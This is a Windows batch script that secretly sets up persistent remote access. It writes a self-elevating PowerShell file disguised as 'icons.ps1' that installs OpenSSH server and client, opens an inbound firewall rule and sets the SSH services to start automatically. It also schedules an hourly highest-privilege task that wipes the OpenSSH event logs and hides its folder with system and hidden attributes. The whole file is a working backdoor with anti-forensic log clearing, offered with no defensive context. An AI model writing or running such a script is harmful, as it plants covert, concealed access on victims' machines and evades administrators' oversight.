@echo off
title Terminal
MKDIR C:\"Program Files"\SystemTD
echo wevtutil cl OpenSSH/Admin > C:\"Program Files"\SystemTD\files.txt
echo wevtutil cl OpenSSH/Operational >> C:\"Program Files"\SystemTD\files.txt
echo wevtutil cl OpenSSH/Debug >> C:\"Program Files"\SystemTD\files.txt
rename C:\"Program Files"\SystemTD\files.txt files.bat
echo param([switch]$Elevated) > C:\"Program Files"\SystemTD\icons.txt
echo function Test-Admin { >> C:\"Program Files"\SystemTD\icons.txt
echo   $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent()) >> C:\"Program Files"\SystemTD\icons.txt
echo   $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) >> C:\"Program Files"\SystemTD\icons.txt
echo } >> C:\"Program Files"\SystemTD\icons.txt
echo if ((Test-Admin) -eq $false)  { >> C:\"Program Files"\SystemTD\icons.txt
echo 	    if ($elevated)  >> C:\"Program Files"\SystemTD\icons.txt
echo { >> C:\"Program Files"\SystemTD\icons.txt
echo } >> C:\"Program Files"\SystemTD\icons.txt
echo else { >> C:\"Program Files"\SystemTD\icons.txt
echo         Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition)) >> C:\"Program Files"\SystemTD\icons.txt
echo } >> C:\"Program Files"\SystemTD\icons.txt
echo exit >> C:\"Program Files"\SystemTD\icons.txt
echo } >> C:\"Program Files"\SystemTD\icons.txt
echo Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 >> C:\"Program Files"\SystemTD\icons.txt
echo Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 >> C:\"Program Files"\SystemTD\icons.txt
echo New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Service sshd -Enabled True -Direction Inbound -Protocol TCP -Action Allow -Profile Domain >> C:\"Program Files"\SystemTD\icons.txt
echo exit >> C:\"Program Files"\SystemTD\icons.txt
rename C:\"Program Files"\SystemTD\icons.txt icons.ps1
powershell.exe -ExecutionPolicy Bypass -file "C:\Program Files\SystemTD\icons.ps1"
sc config ssh-agent start=auto
sc config sshd start=auto
sc start ssh-agent
sc start sshd
CONFIG] Creating task to clear logs automaticly
schtasks /create /TN SystemTD /TR "C:\Program Files\SystemTD\files.bat" /SC hourly /RL highest
attrib C:\"Program Files"\SystemTD +S +H